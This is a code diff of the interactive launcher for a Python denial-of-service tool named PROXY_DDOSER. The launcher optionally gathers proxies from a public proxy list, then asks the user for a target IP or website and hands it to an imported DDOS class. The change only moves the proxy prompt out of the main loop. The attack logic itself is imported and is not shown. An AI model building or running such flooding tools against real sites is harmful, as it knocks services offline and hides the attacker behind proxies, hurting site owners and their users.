@@ -2,15 +2,15 @@ from Classes import DDOS , Load_Automaticaly_Proxy , proxy_sender
 print('\n\n\n')
 print('\x1b[6;30;42m','Github : www.github.com/amiralirj ', '\x1b[0m')
 print(' instagram : @amiralirj \n telegram : @amiralirj_pv \n\n')
-
-
+#-------------------------------------------------------------------------------------------------------------
+text=input('hello welcome to PROXY_DDOSER ! do you want to get proxies automatically ? y/n     ⟹: ')
+if text.lower()=='y':
+    try:
+        Load_Automaticaly_Proxy()
+        print('Proxies are Cheaking automatically ! Please wait for 30-40 seconds to find proxies !')
+    except ConnectionError :print('Problem occurred! CANT CONNECT TO (api.proxyscrape.com) ! PLEASE TRY VPN ')
+#-------------------------------------------------------------------------------------------------------------
 while True:
-    text=input('hello welcome to PROXY_DDOSER ! do you want to get proxies automatically ? y/n     ⟹: ')
-    if text.lower()=='y':
-        try:
-            Load_Automaticaly_Proxy()
-            print( 'Proxies are Cheaking automatically ! Please wait for 30-40 seconds to find proxies !')
-        except ConnectionError :print('Problem occurred! CANT CONNECT TO (api.proxyscrape.com) ! PLEASE TRY VPN ')
     text=input('Send Your target ip or site address      ⟹:')
     try:site=DDOS(text.replace('https://','').replace('http://',''))
     except ConnectionAbortedError:
